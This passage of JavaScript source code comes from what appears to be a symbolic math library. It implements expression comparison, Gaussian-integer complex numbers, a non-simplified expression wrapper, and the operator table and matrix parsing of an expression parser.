//Expression.Negation.prototype.compare4Multiplication = function (y) {
//TODO: fix, more tests
//  return new Expression.Multiplication(Expression.ONE.negate(), this.a).compare4Multiplication(y);
//};

Expression.Addition.prototype.compare4Addition = function (y) {
  // cos(a + b) + cos(a + b)
  var x = this;
  return Expression.Addition.compare4Addition(x, y);
};

//!!!
Expression.Addition.prototype.compare4Multiplication = function (y) {
  var x = this;
  var i = x.summands();
  var j = y.summands();
  var a = i.next().value;
  var b = j.next().value;
  while (a != null && b != null) {
    var c = a.compare4Multiplication(b);
    if (c !== 0) {
      return c;
    }
    a = i.next().value;
    b = j.next().value;
  }
  return a != null ? +1 : (b != null ? -1 : 0);
};

Expression.Addition.prototype.compare4MultiplicationSymbol = function (x) {
  return 0 - this.compare4Multiplication(x);
};

Expression.Addition.compare4Addition = function (x, y) {
  var i = x.summands();
  var j = y.summands();
  var a = i.next().value;
  var b = j.next().value;
  while (a != null && b != null) {
    var c = a.compare4Addition(b);
    if (c !== 0) {
      return c;
    }
    a = i.next().value;
    b = j.next().value;
  }
  return a != null ? +1 : (b != null ? -1 : 0);
};

//!!!


//!new 2017-04-26
Expression.Degrees = function (value) {
  this.value = value;
};
Expression.Degrees.prototype = Object.create(Expression.prototype);
Expression.Degrees.prototype.toString = function (options) {
  return this.value.toString(options) + "\u00B0";
};
Expression.Degrees.prototype.equals = function (y) {
  return y instanceof Expression.Degrees && this.value.equals(y.value);
};
Expression.Degrees.prototype.compare4AdditionSymbol = function (y) {
  return -1;
};

})();
(function () {
"use strict";
  
  

  var Integer = Expression.Integer;

  function Complex(real, imaginary) {
    //Expression.call(this);
    if (!(real instanceof Integer) || !(imaginary instanceof Integer) || imaginary.compareTo(Expression.ZERO) === 0) {
      throw new RangeError();
    }
    this.real = real;
    this.imaginary = imaginary;
  }

  Complex.prototype = Object.create(Expression.prototype);

  Expression.I = new Complex(Expression.ZERO, Expression.ONE);
  Expression.Complex = Complex;

  Complex.prototype.add = function (y) {
    return y.addComplex(this);
  };
  Expression.prototype.addComplex = function (x) {
    return this.addExpression(x);
  };
  Integer.prototype.addComplex = function (x) {
    return new Complex(x.real.add(this), x.imaginary);
  };
  Complex.prototype.addComplex = function (x) {
    var real = x.real.add(this.real);
    var imaginary = x.imaginary.add(this.imaginary);
    return imaginary.compareTo(Expression.ZERO) === 0 ? real : new Complex(real, imaginary);
  };
  Complex.prototype.addInteger = function (x) {
    return new Complex(x.add(this.real), this.imaginary);
  };

  Complex.prototype.equals = function (y) {
    return y instanceof Complex && this.real.equals(y.real) && this.imaginary.equals(y.imaginary) ? true : false;
  };

  Complex.prototype.compare4AdditionSymbol = function (x) {
    return +1;
  };
  Complex.prototype.compare4MultiplicationNthRoot = function (x) {
    return +1;
  };
  Complex.prototype.compare4Addition = function (y) {
    if (y instanceof Complex) {
      return 0;
    }
    if (y instanceof Integer) {
      return 0;
    }
    return -1;
  };
  Complex.prototype.compare4Multiplication = function (y) {
    if (y instanceof Complex) {
      if (y.equals(this)) {
        return 0;
      }
      return 0;
      //TODO: fix
      //throw new RangeError("NotSupportedError");//TODO:
    }
    return -1;//?
  };
  Complex.prototype.compare4MultiplicationSymbol = function (y) {
    return +1;
  };
  Complex.prototype.multiply = function (y) {
    return y.multiplyComplex(this);
  };
  Complex.prototype.multiplyComplex = function (x) {
    var real = x.real.multiply(this.real).subtract(x.imaginary.multiply(this.imaginary));
    var imaginary = x.real.multiply(this.imaginary).add(x.imaginary.multiply(this.real));
    return imaginary.compareTo(Expression.ZERO) === 0 ? real : new Complex(real, imaginary);
  };
  Expression.prototype.multiplyComplex = function (x) {
    return this.multiplyExpression(x);    
  };
  Integer.prototype.multiplyComplex = function (x) {
    if (this.compareTo(Expression.ZERO) === 0) {
      return this;
    }
    return new Complex(x.real.multiply(this), x.imaginary.multiply(this));
  };
  Complex.prototype.multiplyInteger = function (x) {
    if (x.compareTo(Expression.ZERO) === 0) {
      return x;
    }
    return new Complex(x.multiply(this.real), x.multiply(this.imaginary));
  };

  Complex.prototype.conjugate = function () {
    return new Complex(this.real, this.imaginary.negate());
  };
  //Complex.prototype.divideExpression = function (x) {
  //  var y = this;
  //  return x.multiply(y.conjugate()).divide(y.multiply(y.conjugate()));
  //};
  Complex.prototype.getPrecedence = function () {
    return this.real.equals(Expression.ZERO) ? (this.imaginary.equals(Expression.ONE) ? 1000 : 3) : 2; // precedence.binary['+']
  };

  Complex.prototype.truncatingDivide = function (f) {
    // f instancoef Integer
    return new Complex(this.real.truncatingDivide(f), this.imaginary.truncatingDivide(f));
  };

  Complex.prototype.toStringInternal = function (options, times, i, minus, plus, start, end, toString) {
    if (this.real.equals(Expression.ZERO)) {
      if (this.imaginary.equals(Expression.ONE)) {
        return i;
      }
      if (this.imaginary.equals(Expression.ONE.negate())) {
        return start + minus + i + end;
      }
      return start + toString(this.imaginary, options) + times + i + end;
    }
    var isNegative = this.imaginary.isNegative();
    var imaginary = (isNegative ? this.imaginary.negateCarefully() : this.imaginary);
    var si = (imaginary.equals(Expression.ONE) ? i : start + toString(imaginary, options) + times + i + end);
    var sr = toString(this.real, options);
    return start + sr + (isNegative ? minus : plus) + si + end;
  };

  Complex.prototype.toString = function (options) {
    return this.toStringInternal(options, "", "i", "-", "+", "", "", function (x, options) { return x.toString(options); });
  };

  Expression.getComplexConjugate = function (e) {
    if (!Expression.has(e, Complex)) {
      return undefined;
    }
    var c = Expression.ZERO;
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      var f = undefined;
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        if (y instanceof Complex) {
          f = y;
        }
      }
      if (f == undefined) {
        c = c.add(x);
      } else {
        var fc = f.conjugate();
        c = c.add(x.multiply(fc).divide(f.multiply(fc)).multiply(fc));
      }
    }
    //!?
    if (c.equals(e)) {
      return undefined;
    }
    //!?
    return c;
  };
  
  Complex.prototype.compare4MultiplicationInteger = function (y) {
    return +1;
  };

  Complex.prototype.remainderInteger = function (x) {
    return Complex.prototype.remainder.call(x, this);
  };

  Complex.prototype.remainder = function (y) {
    function norm(x) {
      return x instanceof Expression.Integer ? x.multiply(x) : x.multiply(x.conjugate());
    }
    function roundDivision(a, b) {
      if (b.compareTo(Expression.ZERO) < 0) {
        b = b.negate();
        a = a.negate();
      }
      var sign = a.compareTo(Expression.ONE) < 0 ? Expression.ONE.negate() : Expression.ONE;
      return a.add(b.truncatingDivide(Expression.TWO).multiply(sign)).truncatingDivide(b);
    }
    var x = this;
    var n = y instanceof Expression.Integer ? x : x.multiply(y.conjugate());
    var d = y instanceof Expression.Integer ? y : y.multiply(y.conjugate());
    //TODO: fix
    var q1 = n instanceof Complex ? roundDivision(n.real, d) : roundDivision(n, d);
    var q2 = n instanceof Complex ? roundDivision(n.imaginary, d) : Expression.ZERO;
    var q = q2.compareTo(Expression.ZERO) === 0 ? q1 : new Complex(q1, q2);
    var r =  x.subtract(y.multiply(q));
    if (norm(r).compareTo(norm(y)) >= 0) {
      throw new TypeError();
    }
    return r;
  };

  Complex.prototype.primeFactor = function () {

    function canBeSquare(n) {
      // https://www.johndcook.com/blog/2008/11/17/fast-way-to-test-whether-a-number-is-a-square/#comment-15700
      //var bitset = 0;
      //for (var i = 0; i < 32; i += 1) {
      //  bitset |= 1 << ((i * i) % 32);
      //}
      var bitset = 33751571;
      var result = (bitset >> (n & 31)) & 1;
      return result === 1;
    }
    function norm(a, b) {
      return a * a + b * b;
    }
    function hasDivisor(r, i, a, b) {
      var d = a * a + b * b;
      var x = r * a + i * b;
      var y = i * a - r * b;
      return x % d === 0 && y % d === 0;
    }

    var r = this.real.toNumber();
    var i = this.imaginary.toNumber();
    var n = norm(r, i);
    if (n > (9007199254740991 + 1) / 2) {
      throw new RangeError("NotSupportedError");
    }

    for (var fs = QuadraticInteger._factors(n), p = fs.next().value; p != null; p = fs.next().value) {
      var b = 0;
      while (p - b * b > 0) {
        if (canBeSquare(p - b * b)) {
          var a = Math.floor(Math.sqrt(p - b * b + 0.5));
          if (a * a === p - b * b) {
            if (norm(a, b) > 1 && hasDivisor(r, i, a, b)) {
              return b === 0 ? new Expression.Complex(Expression.ZERO, Expression.Integer.fromNumber(a)) : new Complex(Expression.Integer.fromNumber(a), Expression.Integer.fromNumber(b));
            }
          }
        }
        b += 1;
      }
    }

    if (n > 1) {
      throw new TypeError();
    }
    return this;
  };

  Expression.Complex = Complex;

})();
(function () {
"use strict";
  
  
  
  

  var idCounter = 0;

  function NonSimplifiedExpression(e, position, length, input) {
    //Expression.call(this);
    this.e = e;
    this.position = position == undefined ? -1 : position;
    this.length = length == undefined ? -1 : length;
    this.input = input == undefined ? "" : input;
    this.id = (idCounter += 1);
  }

  NonSimplifiedExpression.prototype = Object.create(Expression.prototype);
  
  // same set of public properties (and same order) as for Expressions ... 
  NonSimplifiedExpression.prototype.negate = function () {
    return new NonSimplifiedExpression(new Expression.Negation(this));
  };
  NonSimplifiedExpression.prototype.add = function (y) {
    return new NonSimplifiedExpression(new Expression.Addition(this, y));
  };
  NonSimplifiedExpression.prototype.subtract = function (y) {
    return new NonSimplifiedExpression(new Expression.Subtraction(this, y));
  };
  NonSimplifiedExpression.prototype.divide = function (y) {
    return new NonSimplifiedExpression(new Expression.Division(this, y));
  };
  NonSimplifiedExpression.prototype.multiply = function (y) {
    return new NonSimplifiedExpression(new Expression.Multiplication(this, y));
  };
  NonSimplifiedExpression.prototype.pow = function (y) {
    return new NonSimplifiedExpression(new Expression.Exponentiation(this, y));
  };
  
  NonSimplifiedExpression.prototype.exp = function () {
    return new NonSimplifiedExpression(Expression.E).pow(this);
  };
  NonSimplifiedExpression.prototype.inverse = function () {
    return new NonSimplifiedExpression(new Expression.Exponentiation(this, Expression.ONE.negate())); // to support the MathML serialization of the `inverse(B)`
    //return new NonSimplifiedExpression(Expression.ONE).divide(this);
  };

/*
  NonSimplifiedExpression.prototype.powExpression = function (x) {
    return new NonSimplifiedExpression(new Expression.Exponentiation(x, this));
  };
  NonSimplifiedExpression.prototype.multiplyAddition = function (x) {
    return new NonSimplifiedExpression(new Expression.Multiplication(x, this));
  };
  NonSimplifiedExpression.prototype.multiplyDivision = function (x) {
    return new NonSimplifiedExpression(new Expression.Multiplication(x, this));
  };
  NonSimplifiedExpression.prototype.multiplyMatrix = function (x) {
    return new NonSimplifiedExpression(new Expression.Multiplication(x, this));
  };
  NonSimplifiedExpression.prototype.addDivision = function (x) {
    return new NonSimplifiedExpression(new Expression.Addition(x, this));
  };

  //?
  NonSimplifiedExpression.prototype.addMatrix = function (x) {
    return new NonSimplifiedExpression(new Expression.Addition(x, this));
  };

  NonSimplifiedExpression.prototype.addExpression = function (x) {
    return new NonSimplifiedExpression(new Expression.Addition(x, this));
  };
  NonSimplifiedExpression.prototype.multiplyExpression = function (x) {
    return new NonSimplifiedExpression(new Expression.Multiplication(x, this));
  };
  NonSimplifiedExpression.prototype.divideExpression = function (x) {
    return new NonSimplifiedExpression(new Expression.Division(x, this));
  };
*/

  NonSimplifiedExpression.prototype.addExpression = function (x) {
    throw new TypeError();
  };

  NonSimplifiedExpression.prototype.squareRoot = function () {
    return new NonSimplifiedExpression(new Expression.SquareRoot(this));
  };
  NonSimplifiedExpression.prototype.cubeRoot = function () {
    return new NonSimplifiedExpression(new Expression.CubeRoot(this));
  };
  NonSimplifiedExpression.prototype.sin = function () {
    return new NonSimplifiedExpression(new Expression.Sin(this));
  };
  NonSimplifiedExpression.prototype.cos = function () {
    return new NonSimplifiedExpression(new Expression.Cos(this));
  };
  NonSimplifiedExpression.prototype.rank = function () {
    return new NonSimplifiedExpression(new Expression.Rank(this));
  };
  NonSimplifiedExpression.prototype.determinant = function () {
    return new NonSimplifiedExpression(new Expression.Determinant(this));
  };
  NonSimplifiedExpression.prototype.rowReduce = function () {
    return new NonSimplifiedExpression(new Expression.RowReduce(this));
  };
  //?
  NonSimplifiedExpression.prototype.GF2 = function () {
    return new NonSimplifiedExpression(new Expression.GF2(this));
  };
  NonSimplifiedExpression.prototype.transpose = function () {
    return new NonSimplifiedExpression(new Expression.Transpose(this));
  };
  NonSimplifiedExpression.prototype.adjugate = function () {
    return new NonSimplifiedExpression(new Expression.Adjugate(this));
  };

  NonSimplifiedExpression.prototype.elementWisePower = function (a) {
    return new NonSimplifiedExpression(new Expression.ElementWisePower(this, a));
  };
  NonSimplifiedExpression.prototype.transformNoAnswerExpression = function (name, second) {
    return new NonSimplifiedExpression(new Expression.NoAnswerExpression(this, name, second));
  };
  NonSimplifiedExpression.prototype.transformEquality = function (b) {
    return new NonSimplifiedExpression(new Expression.Equality(this, b));
  };

  NonSimplifiedExpression.prototype.addPosition = function (position, length, input) {
    return new NonSimplifiedExpression(this.e, position, length, input);
  };

  var prepare = function (x, holder) {
    var e = x.simplify();
    ExpressionParser.startPosition = holder.position;
    ExpressionParser.endPosition = holder.position + holder.length;
    ExpressionParser.input = holder.input;
    return e;
  };

  //TODO:
  Expression.prototype.simplifyInternal = function (holder) {
    return this;
  };
  Expression.Exponentiation.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).pow(prepare(this.b, holder));
  };
  Expression.Multiplication.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).multiply(prepare(this.b, holder));
  };
  Expression.Addition.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).add(prepare(this.b, holder));
  };
  Expression.Division.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).divide(prepare(this.b, holder));
  };
  Expression.SquareRoot.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).squareRoot();
  };
  Expression.CubeRoot.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).cubeRoot();
  };
  Expression.Sin.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).sin();
  };
  Expression.Cos.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).cos();
  };
  Expression.Rank.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).rank();
  };
  Expression.Determinant.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).determinant();
  };
  Expression.RowReduce.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).rowReduce();
  };
  Expression.GF2.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).GF2();
  };
  Expression.Transpose.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).transpose();
  };
  Expression.Adjugate.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).adjugate();
  };
  Expression.NoAnswerExpression.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).transformNoAnswerExpression(this.name, this.second == undefined ? undefined : prepare(this.second, holder));
  };
  Expression.Equality.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).transformEquality(prepare(this.b, holder));
  };
  Expression.Matrix.prototype.simplifyInternal = function (holder) {
    return new Expression.Matrix(this.matrix.map(function (e, i, j) {
      return prepare(e, holder);
    }));
  };

  Expression.prototype.simplify = function () {
    return this;//? this.simplifyInternal(undefined);
  };
  NonSimplifiedExpression.prototype.simplify = function () {
    //return this.e.simplifyInternal(this);
    //return this.e.simplifyInternal(this).simplifyExpression();//new

    // to get an expression after a double "wrapping"
    return this.e.simplify().simplifyInternal(this).simplifyExpression();//new
  };
  NonSimplifiedExpression.prototype.toString = function (options) {
    return this.e.toString(options);
  };
  NonSimplifiedExpression.prototype.equals = function (y) {
    return this.simplify().equals(y.simplify());
  };

  //!
  NonSimplifiedExpression.prototype.unwrap = function () {
    return this.e;
  };
  Expression.Negation.prototype.simplifyInternal = function (holder) {
    return prepare(this.b, holder).negate();
  };
  Expression.Subtraction.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).subtract(prepare(this.b, holder));
  };
  NonSimplifiedExpression.prototype.isUnaryPlusMinus = function () {
    return this.e.isUnaryPlusMinus();
  };
  NonSimplifiedExpression.prototype.getPrecedence = function () {
    return this.e.getPrecedence();
  };

  Expression.ElementWisePower.prototype.simplifyInternal = function (holder) {
    return prepare(this.a, holder).elementWisePower(prepare(this.b, holder));
  };

//?
  NonSimplifiedExpression.prototype.getId = function () {
    return "e" + this.id.toString();
  };
  Expression.prototype.getIds = function () {
    return "";
  };
  Expression.BinaryOperation.prototype.getIds = function () {
    var a = this.a.getIds();
    var b = this.b.getIds();
    return a === "" ? b : (b === "" ? a : a + ", " + b);
  };
  NonSimplifiedExpression.prototype.getIds = function () {
    var a = this.getId();
    var b = this.e.getIds();
    return a === "" ? b : (b === "" ? a : a + ", " + b);
  };

  NonSimplifiedExpression.prototype.isNegative = function () {
    //return this.e.isNegative();
    return false;
  };
  NonSimplifiedExpression.prototype.negateCarefully = function () {
    return new NonSimplifiedExpression(this.e.negateCarefully());
  };
  NonSimplifiedExpression.prototype.isRightToLeftAssociative = function () {
    return this.e.isRightToLeftAssociative();
  };

  NonSimplifiedExpression.prototype.isExact = function () {
    return this.e.isExact();
  };

  Expression.NonSimplifiedExpression = NonSimplifiedExpression;

  self.NonSimplifiedExpression = NonSimplifiedExpression;

})();
(function () {
"use strict";
/*jslint plusplus: true, vars: true, indent: 2 */
  
  

  //var isAlpha = function (code) {
  //  return (code >= "a".charCodeAt(0) && code <= "z".charCodeAt(0)) ||
  //         (code >= "A".charCodeAt(0) && code <= "Z".charCodeAt(0));
  //};

  // http://en.wikipedia.org/wiki/Operators_in_C_and_C%2B%2B#Operator_precedence

  var LEFT_TO_RIGHT = 0;
  var RIGHT_TO_LEFT = 1;

  var EQUALITY_PRECEDENCE = 1;
  var ADDITIVE_PRECEDENCE = 2;
  var MULTIPLICATIVE_PRECEDENCE = 3;
  var UNARY_PRECEDENCE = 5;

  var UNARY_PRECEDENCE_PLUS_ONE = UNARY_PRECEDENCE + 1; // TODO: remove

  var Operator = function (name, arity, rightToLeftAssociative, precedence, i) {
    this.name = name;
    this.arity = arity;
    this.rightToLeftAssociative = rightToLeftAssociative;
    this.precedence = precedence;
    this.i = i;
    //this.xyz = isAlpha(name.charCodeAt(0)) && isAlpha(name.charCodeAt(name.length - 1));
  };

  var ADDITION = new Operator("+", 2, LEFT_TO_RIGHT, ADDITIVE_PRECEDENCE, function (a, b) {
    return a.add(b);
  });
  var MULTIPLICATION = new Operator("*", 2, LEFT_TO_RIGHT, MULTIPLICATIVE_PRECEDENCE, function (a, b) {
    return a.multiply(b);
  });
  // Exponentiation has precedence as unary operators
  var EXPONENTIATION = new Operator("^", 2, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a, b) {
    return a.pow(b);
  });

  var UNARY_PLUS = new Operator("+", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (e) {
    return e;
  });
  var UNARY_MINUS = new Operator("-", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (e) {
    return e.negate();
  });

  var toDegrees = function (a) {
    if (a instanceof Expression.Integer) {
      return new Expression.Degrees(a);
    }
    if (a instanceof Expression.NonSimplifiedExpression && a.e instanceof Expression.Integer) {
      return new Expression.NonSimplifiedExpression(new Expression.Degrees(a));
    }
    if (a instanceof Expression.NonSimplifiedExpression && a.e instanceof Expression.Negation && a.e.b instanceof Expression.NonSimplifiedExpression && a.e.b.e instanceof Expression.Integer) {
      return new Expression.NonSimplifiedExpression(new Expression.Degrees(a));
    }
    return null;
  };

  var prepareTrigonometricArgument = function (a) {
    var x = toDegrees(a);
    return x == null ? a : x;
  };

  var notSupported = function (a) {
    throw new TypeError();
  };

  var operations = [
    new Operator("=", 2, LEFT_TO_RIGHT, EQUALITY_PRECEDENCE, function (a, b) {
      return a.transformEquality(b);
    }),
    new Operator(";", 2, LEFT_TO_RIGHT, EQUALITY_PRECEDENCE, function (a, b) {
      throw new RangeError("NotSupportedError");
      //return a.transformStatement(b);
    }),

    ADDITION,
    new Operator("-", 2, LEFT_TO_RIGHT, ADDITIVE_PRECEDENCE, function (a, b) {
      return a.subtract(b);
    }),
    MULTIPLICATION,
    new Operator("/", 2, LEFT_TO_RIGHT, MULTIPLICATIVE_PRECEDENCE, function (a, b) {
      return a.divide(b);
    }),
    new Operator("\\", 2, LEFT_TO_RIGHT, MULTIPLICATIVE_PRECEDENCE, function (a, b) {
      return a.inverse().multiply(b);
    }),
    //new Operator("%", 2, LEFT_TO_RIGHT, MULTIPLICATIVE_PRECEDENCE, function (a, b) {
    //  return a.remainder(b);
    //}),
    //UNARY_PLUS,
    //UNARY_MINUS,
    EXPONENTIATION,
    new Operator("**", EXPONENTIATION.arity, EXPONENTIATION.rightToLeftAssociative, EXPONENTIATION.precedence, EXPONENTIATION.i),
    new Operator(".^", 2, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a, b) {
      return a.elementWisePower(b);
    }),//?
    new Operator("\u221A", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.squareRoot();
    }),
    new Operator("sqrt", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.squareRoot();
    }),
    new Operator("\u221B", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.cubeRoot();
    }),
    new Operator("cbrt", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.cubeRoot();
    }),
    new Operator("rank", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.rank();
    }),
    new Operator("adjugate", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.adjugate();
    }),    
    //new Operator("trace", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
    //  return Expression.transformTrace(a);
    //}),
    new Operator("inverse", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.inverse();
    }),
    new Operator("det", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {//?
      return a.determinant();
    }),
    new Operator("determinant", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.determinant();
    }),
    new Operator("row-reduce", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.rowReduce();
    }),
    new Operator("transpose", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.transpose();
    }),
    //new Operator("^T", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, function (a) {
    //  return a.transpose();
    //}),
    //new Operator("^t", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, function (a) {
    //  return a.transpose();
    //}),
    new Operator("'", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, function (a) {
      return a.transpose();
    }),

    //?
    new Operator("solve", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.transformNoAnswerExpression("solve");//?
    }),

    new Operator("GF2", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE, function (a) {
      return a.GF2();
    }),

    new Operator("cos", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      if (a.sin == undefined || a.cos == undefined) {
        throw new RangeError("NotSupportedError");
      }
      a = prepareTrigonometricArgument(a);
      return a.cos();
    }),
    new Operator("sin", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      if (a.sin == undefined || a.cos == undefined) {
        throw new RangeError("NotSupportedError");
      }
      a = prepareTrigonometricArgument(a);
      return a.sin();
    }),
    new Operator("tan", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      if (a.sin == undefined || a.cos == undefined) {
        throw new RangeError("NotSupportedError");
      }
      //a = prepareTrigonometricArgument(a);
      //return a.sin().divide(a.cos());
      var a2 = prepareTrigonometricArgument(a.multiply(Expression.TWO));
      return a2.sin().divide(a2.cos().add(Expression.ONE));
    }),
    new Operator("°", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE, function (a) {
      var x = toDegrees(a);
      if (x == null) {
        throw new RangeError("NotSupportedError");
      }
      return x;
    }),

    new Operator("exp", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a.exp();
    }),
    new Operator("log", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      throw new RangeError("NotSupportedError");
    }),

    new Operator("\\left", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a;
    }),
    new Operator("\\right", 1, LEFT_TO_RIGHT, UNARY_PRECEDENCE_PLUS_ONE, function (a) {
      return a;
    }),
 
    new Operator("cosh", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, notSupported),
    new Operator("sinh", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, notSupported),
    new Operator("tanh", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, notSupported),

    new Operator("arccos", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, notSupported),
    new Operator("arcsin", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, notSupported),
    new Operator("arctan", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, notSupported),
    new Operator("arcosh", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, notSupported),
    new Operator("arsinh", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, notSupported),
    new Operator("artanh", 1, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, notSupported),

    new Operator("frac", 2, RIGHT_TO_LEFT, UNARY_PRECEDENCE_PLUS_ONE, function (a, b) {
      return a.divide(b);
    })
  ];

  function OperationSearchCache() {
    this.map = {};
    this.re = null;
  }

  OperationSearchCache.prototype.append = function (operator) {
    this.map[operator.name.toLowerCase()] = operator;
    this.re = null;
  };
  OperationSearchCache.prototype.getByName = function (name) {
    return this.map[name.toLowerCase()];
  };
  OperationSearchCache.prototype.getRegExp = function () {
    // https://stackoverflow.com/questions/3561493/is-there-a-regexp-escape-function-in-javascript
    var escapeRegExp = function (s) {
      return s.replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&');
    };
    // longest: ? "^T" and "^"
    // ignore case
    if (this.re == null) {//TODO: ?
      var names = [];
      for (var name in this.map) {
        if (Object.prototype.hasOwnProperty.call(this.map, name)) {
          names.push(name);
        }
      }
      names.sort(function (a, b) {
        return a + '\uFFFF' < b + '\uFFFF' ? -1 : +1;
      });
      var source = new Array(names.length);
      for (var i = 0; i < names.length; i += 1) {
        source[i] = escapeRegExp(names[i]);
      }
      this.re = new RegExp('^(?:' + source.join('|') + ')', 'i');
    }
    return this.re;
  };

  var operationSearchCache = new OperationSearchCache();

  var i = -1;
  while (++i < operations.length) {
    operationSearchCache.append(operations[i]);
  }

  var nextToken = function (tokenizer) {
    var token = null;
    do {
      token = tokenizer.next();
    } while (token.type === 'whitespace');
    return token;
  };

  var parsePunctuator = function (tokenizer, token, punctuator) {
    if (token.type !== 'punctuator' || token.value !== punctuator) {
      ExpressionParser.startPosition = tokenizer.position - token.value.length;
      ExpressionParser.endPosition = tokenizer.position;
      ExpressionParser.input = tokenizer.input;
      if (token.type === 'EOF') {
        throw new RangeError("UserError: unexpected end of input, '" + punctuator + "' expected");
      }
      throw new RangeError("UserError: unexpected '" + token.value + "', '" + punctuator + "' expected");
    }
    token = nextToken(tokenizer);
    return token;
  };

  function ParseResult(result, token) {
    this.result = result;
    this.token = token;
  }

  var parseMatrix = function (tokenizer, token, context) {
    var openingBracket = "{";
    var closingBracket = "}";

    var rows = [];
    var hasNextRow = true;
    while (hasNextRow) {
      token = parsePunctuator(tokenizer, token, openingBracket);
      var row = [];
      var hasNextCell = true;
      while (hasNextCell) {
        var tmp = parseExpression(tokenizer, token, context, 0, undefined);
        token = tmp.token;
        row.push(tmp.result);
        if (token.type === 'punctuator' && token.value === ",") {
          hasNextCell = true;
          token = nextToken(tokenizer);
        } else {
          hasNextCell = false;
        }
      }
      token = parsePunctuator(tokenizer, token, closingBracket);
      rows.push(row);
      if (token.type === 'punctuator' && token.value === ",") {
        hasNextRow = true;
        token = nextToken(tokenizer);
      } else {
        hasNextRow = false;
      }
    }
    token = parsePunctuator(tokenizer, token, "}");
    return new ParseResult(context.wrap(Expression.Matrix.fromArray(rows)), token);
  };

  var parseLaTeXMatrix = function (tokenizer, token, context, kind) {
    token = nextToken(tokenizer);
    var rows = [];
    var firstRow = true;
    while (firstRow || (token.type === 'punctuator' && token.value === '\\\\')) {
      if (firstRow) {
        firstRow = false;
      } else {
        token = nextToken(tokenizer);
      }
      var row = [];
      var firstCell = true;
      while (firstCell || token.type === 'punctuator' && token.value === "&") {
        if (firstCell) {
          firstCell = false;
        } else {
          token = nextToken(tokenizer);
        }
        var tmp = parseExpression(tokenizer, token, context, ADDITIVE_PRECEDENCE - 1, undefined);
        token = tmp.token;
        row.push(tmp.result);
      }
      rows.push(row);
    }
    if (token.type === 'punctuator' && token.value === "\\end{" + kind + "}") {
      token = nextToken(tokenizer);
    }
    return new ParseResult(context.wrap(Expression.Matrix.fromArray(rows)), token);
  };

  var parseLaTeXArgument = function (tokenizer, token, context) {
    return parseExpression(tokenizer, token, context, 0, undefined);
  };

  var getVulgarFraction = function (vulgarFraction) {
    var input = normalizeVulgarFractions(vulgarFraction);
    var e = Expression.Integer.fromString(input.slice(0, input.indexOf('/'))).divide(Expression.Integer.fromString(input.slice(input.indexOf('/') + '/'.length)));
    return e;
  };

  var getDecimalFraction = function (integerPart, nonRepeatingFractionalPart, repeatingFractionalPart, exponentPart) {
    var numerator = Expression.ZERO;
    var denominator = Expression.ONE;

    if (integerPart != undefined) {
